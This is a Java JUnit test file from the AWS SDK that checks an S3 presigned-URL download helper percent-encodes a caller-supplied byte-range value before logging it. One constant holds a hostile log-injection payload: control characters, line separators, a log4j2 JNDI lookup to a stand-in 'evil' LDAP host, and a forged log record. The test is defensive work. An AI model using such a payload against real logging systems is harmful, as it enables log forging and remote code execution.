/*
 * Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
 *
 * Licensed under the Apache License, Version 2.0 (the "License").
 * You may not use this file except in compliance with the License.
 * A copy of the License is located at
 *
 *  http://aws.amazon.com/apache2.0
 *
 * or in the "license" file accompanying this file. This file is distributed
 * on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either
 * express or implied. See the License for the specific language governing
 * permissions and limitations under the License.
 */

package software.amazon.awssdk.services.s3.internal.multipart;

import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.doReturn;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.verify;

import java.net.MalformedURLException;
import java.net.URL;
import java.util.List;
import java.util.concurrent.CompletableFuture;
import java.util.stream.Collectors;
import org.apache.logging.log4j.Level;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import software.amazon.awssdk.core.SplittingTransformerConfiguration;
import software.amazon.awssdk.core.async.AsyncResponseTransformer;
import software.amazon.awssdk.services.s3.S3AsyncClient;
import software.amazon.awssdk.services.s3.model.GetObjectResponse;
import software.amazon.awssdk.services.s3.presignedurl.AsyncPresignedUrlExtension;
import software.amazon.awssdk.services.s3.presignedurl.model.PresignedUrlDownloadRequest;
import software.amazon.awssdk.testutils.LogCaptor;

/**
 * Verifies that the caller-controlled {@code range} value logged by {@link PresignedUrlDownloadHelper} on the single
 * part fallback path cannot inject line breaks or control characters into the log record.
 */
@ExtendWith(MockitoExtension.class)
class PresignedUrlDownloadHelperLoggingTest {

    /**
     * The output alphabet of {@code SdkHttpUtils.urlEncode}: no line terminator, no C0/C1 control, no DEL, no ESC, no
     * bidi character and no single quote, so the quotes around the value in the message are trustworthy delimiters.
     */
    private static final String SAFE_ALPHABET_REGEX = "^[A-Za-z0-9._~%-]*$";

    private static final String FORGED_RECORD =
        "2026-09-14 12:00:00 [main] DEBUG software.amazon.awssdk.services.s3.internal.multipart.PresignedUrlDownloadHelper"
        + " - forged";

    /**
     * CR, LF, NUL, ESC + an ANSI sequence, NEL (U+0085), LS (U+2028), PS (U+2029), CSI (U+009B), RTL override (U+202E),
     * a log4j2 lookup, an slf4j placeholder and a complete forged log record.
     */
    private static final String HOSTILE_RANGE =
        "bytes=0-1" + chars(0x0D, 0x0A, 0x00, 0x1B) + "[31m" + chars(0x85, 0x2028, 0x2029, 0x9B, 0x202E)
        + "${jndi:ldap://evil/x} {} " + FORGED_RECORD;

    @Mock
    private S3AsyncClient s3AsyncClient;

    @Mock
    private AsyncPresignedUrlExtension asyncPresignedUrlExtension;

    @Test
    void downloadObject_hostileRange_logsOnlySafeCharacters() throws MalformedURLException {
        PresignedUrlDownloadRequest request = requestBuilder().range(HOSTILE_RANGE).build();
        stubGetObject();

        String message;
        try (LogCaptor logCaptor = LogCaptor.create(Level.DEBUG)) {
            helper().downloadObject(request, AsyncResponseTransformer.toBytes());
            message = onlyMessage(logCaptor);
        }

        String value = encodedValue(message);
        assertThat(value).matches(SAFE_ALPHABET_REGEX);
        assertThat(message).doesNotContain("\n").doesNotContain("\r");
        // Both an ASCII and a multi-byte line terminator were encoded rather than silently dropped. The hex digit case
        // is not specified by URLEncoder, hence the case-insensitive assertions.
        assertThat(value).containsIgnoringCase("%0A").containsIgnoringCase("%E2%80%A8");
        // The original value is still recoverable.
        assertThat(value).contains("bytes%3D0-1");
        // No slf4j placeholder or log4j2 lookup syntax can be introduced into the pre-formatted message.
        assertThat(value).doesNotContain("{").doesNotContain("}").doesNotContain("$");
    }

    @Test
    void downloadObject_ordinaryRange_logsPercentEncodedValueAndDelegatesUnchanged() throws MalformedURLException {
        PresignedUrlDownloadRequest request = requestBuilder().range("bytes=0-1023").build();
        CompletableFuture<GetObjectResponse> stubbedFuture = stubGetObject();

        String message;
        CompletableFuture<?> result;
        try (LogCaptor logCaptor = LogCaptor.create(Level.DEBUG)) {
            result = helper().downloadObject(request, AsyncResponseTransformer.toBytes());
            message = onlyMessage(logCaptor);
        }

        assertThat(message).isEqualTo("Using single part download because presigned URL request range is included in the"
                                      + " request. range (percent-encoded) = 'bytes%3D0-1023'");
        // HR3: the original, unmodified request is what gets delegated, and the delegate's future is returned as-is.
        verify(asyncPresignedUrlExtension).getObject(eq(request), any(AsyncResponseTransformer.class));
        assertThat(result).isSameAs(stubbedFuture);
    }

    @Test
    void downloadObject_noRange_doesNotLogSinglePartMessage() throws MalformedURLException {
        PresignedUrlDownloadRequest request = requestBuilder().build();

        try (LogCaptor logCaptor = LogCaptor.create(Level.DEBUG)) {
            helper().downloadObject(request, splittingTransformer());
            // The multipart path logs its own messages, but never the single part fallback one, and never a range.
            assertThat(messages(logCaptor)).isNotEmpty()
                                           .allSatisfy(message -> assertThat(message).doesNotContain("single part")
                                                                                     .doesNotContain("range"));
        }
    }

    private PresignedUrlDownloadHelper helper() {
        return new PresignedUrlDownloadHelper(s3AsyncClient, asyncPresignedUrlExtension, 1024L, 1024L);
    }

    private static PresignedUrlDownloadRequest.Builder requestBuilder() throws MalformedURLException {
        return PresignedUrlDownloadRequest.builder()
                                          .presignedUrl(new URL("https://bucket.s3.amazonaws.com/key?X-Amz-Signature=abc"));
    }

    private CompletableFuture<GetObjectResponse> stubGetObject() {
        CompletableFuture<GetObjectResponse> stubbedFuture =
            CompletableFuture.completedFuture(GetObjectResponse.builder().build());
        doReturn(stubbedFuture).when(asyncPresignedUrlExtension).getObject(any(PresignedUrlDownloadRequest.class),
                                                                          any(AsyncResponseTransformer.class));
        return stubbedFuture;
    }

    /**
     * A transformer that returns a stubbed {@link AsyncResponseTransformer.SplitResult} with a no-op publisher, so the
     * multipart path runs entirely on the calling thread and no background thread logs while the captor is open.
     */
    @SuppressWarnings("unchecked")
    private static AsyncResponseTransformer<GetObjectResponse, GetObjectResponse> splittingTransformer() {
        AsyncResponseTransformer<GetObjectResponse, GetObjectResponse> transformer = mock(AsyncResponseTransformer.class);
        doReturn(AsyncResponseTransformer.SplitResult.<GetObjectResponse, GetObjectResponse>builder()
                                                     .publisher(subscriber -> {
                                                     })
                                                     .resultFuture(new CompletableFuture<>())
                                                     .build())
            .when(transformer).split(any(SplittingTransformerConfiguration.class));
        return transformer;
    }

    private static String onlyMessage(LogCaptor logCaptor) {
        List<String> messages = messages(logCaptor);
        assertThat(messages).hasSize(1);
        return messages.get(0);
    }

    private static List<String> messages(LogCaptor logCaptor) {
        return logCaptor.loggedEvents()
                        .stream()
                        .filter(event -> PresignedUrlDownloadHelper.class.getName().equals(event.getLoggerName()))
                        .map(event -> event.getMessage().getFormattedMessage())
                        .collect(Collectors.toList());
    }

    /**
     * The encoded value is the substring between the last two single quotes; the message itself legitimately contains
     * '(', ')', '=' and spaces, so the whole message cannot be matched against the safe alphabet.
     */
    private static String encodedValue(String message) {
        return message.substring(message.lastIndexOf("= '") + 3, message.length() - 1);
    }

    /**
     * Builds a string from raw code points, so hostile control characters do not have to appear literally in this file.
     */
    private static String chars(int... codePoints) {
        StringBuilder builder = new StringBuilder();
        for (int codePoint : codePoints) {
            builder.appendCodePoint(codePoint);
        }
        return builder.toString();
    }
}
